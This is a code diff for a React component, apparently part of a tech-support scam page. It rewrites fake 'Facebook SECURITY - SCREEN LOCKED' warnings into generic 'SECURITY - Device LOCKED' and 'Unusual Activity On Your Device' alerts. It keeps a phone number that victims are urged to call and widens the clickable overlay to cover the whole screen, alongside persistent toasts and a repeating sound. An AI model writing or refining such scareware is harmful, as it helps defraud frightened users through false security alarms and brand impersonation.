@@ -16,7 +16,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
 
   const showEmergencyToasts = () => {
     toast.dismiss()
-    toast.info("Call Facebook Support immediately:18445131621", {
+    toast.info("Call Support immediately:18445131621", {
       position: "bottom-right",
       autoClose: false,
       hideProgressBar: false,
@@ -126,7 +126,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
 
   const startSoundInterval = () => {
     if (window.emergencyIntervalId) {
-      clearInterval(window.emergencyIntervalId)
+      clearInterval(window.emergencyIntervalId) 
     }
 
     const intervalId = setInterval(() => {
@@ -304,13 +304,13 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
         <div className="fullscreen-notification flash-notification" onClick={handleCall}>
           <span className="fullscreen-indicator animate-ping"></span>
           <Lock size={96} className="mr-1" />
-          Facebook SECURITY - SCREEN LOCKED
+           SECURITY - Device LOCKED
         </div>
 
         <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
           <div className="animate-pulse flex items-center">
             <AlertCircle size={24} className="text-white mr-2" />
-            <span className="text-white font-bold">Facebook SECURITY ALERT</span>
+            <span className="text-white font-bold">SECURITY ALERT</span>
           </div>
         </div>
 
@@ -355,19 +355,19 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
         <div   onClick={(e) => {
                   e.stopPropagation()
                   handleCall()
-                }} className="w-full max-w-md">
+                }} className="fixed inset-0 w-full">
           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
             <div className="flex flex-col items-center space-y-4">
               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
                 <PhoneCall size={48} className="text-white" />
               </div>
-              <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
+              <h2 className="text-2xl font-semibold text-center">Device Support</h2>
               <p className="text-base md:text-lg text-muted-foreground"><br></br>
            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-           We've Detected Unusual Login Activity on Your Facebook Account.Your account may have been accessed from an unknown device or location. For your safety, we recommend reviewing the login now.
+           We've Detected Unusual Activity On Your Device.Your account may have been accessed from an unknown device or location. For your safety, we recommend reviewing your device.
             <br /><br />
           </p>
-              <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
+              <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Support</p>
               <Button
                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
                 onClick={(e) => {
@@ -387,7 +387,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
                 }}
               >
                 <PhoneCall className="mr-2 h-6 w-6" />
-                <span>Back to facebook</span>
+                <span>Back To Home</span>
               </Button>
             </div>
           </Card>
@@ -415,8 +415,8 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
                   <AlertCircle size={32} className="text-white" />
                 </div>
-                <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
-                <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
+                <h2 className="text-2xl font-semibold text-center">Protect Your Device</h2>
+                <p className="text-center text-lg">Connecting you to Support at:</p>
                 <p className="text-2xl font-semibold text-blue-600">18445131621</p>
                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
